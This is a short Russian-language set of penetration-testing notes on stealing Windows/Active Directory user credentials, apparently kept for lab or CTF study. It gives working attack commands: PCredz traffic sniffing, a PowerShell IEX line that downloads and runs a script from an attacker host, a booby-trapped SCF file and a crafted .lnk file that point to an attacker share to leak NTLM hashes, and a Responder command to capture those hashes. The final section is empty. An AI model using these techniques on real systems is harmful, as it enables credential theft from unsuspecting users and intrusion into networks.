#lpe #AD #windows #users

> После того, как мы исчерпаны все варианты, мы можем рассмотреть конкретные методы кражи учетных данных у ничего не подозревающего пользователя путем перехвата его сетевого трафика/локальных команд или атаки на известную уязвимую службу, требующую взаимодействия с пользователем. 
> 
> Один из лучших методов — размещение вредоносных файлов в часто используемых файловых ресурсах в попытке получить хэши паролей пользователей для последующего взлома в автономном режиме.

## Оглавление
- [[#1) Скан сети на учетные данные]]
- [[#2) Командные строки запущенных процессов]]
- [[#3) Создание подложных SCF-файлов]]
- [[#4) Перехват хешей с помощью вредоносного файла .lnk]]
- [[#5) Использование инструмента *ntlm_theft.py*]]

---

## 1) Скан сети на учетные данные 

Используем **PCredz**
```bash
Pcredz -f "file-to-parse.pcap"

Pcredz -i $INTERFACE -v
```

## 2) Командные строки запущенных процессов

*IEX* - запускает процесс в памяти 
```powershell
IEX (iwr 'http://10.10.10.205/procmon.ps1') 
```

## 3) Создание подложных SCF-файлов
<span style="background:#d4b106">НЕ РАБОТАЕТ НА Server 2019</span>
```powershell
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```

запуск *responder* для перехвата хэшей
```bash
sudo responder -wrf -v -I tun0
```

## 4) Перехват хешей с помощью вредоносного файла .lnk
<span style="background:#affad1">В отличии от SCF - работает, но создается сложнее</span>

Необходимо использовать интсрумент [Lnkbomb](https://github.com/dievus/lnkbomb)
или врнучную
```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

## 5) Использование инструмента *ntlm_theft.py*

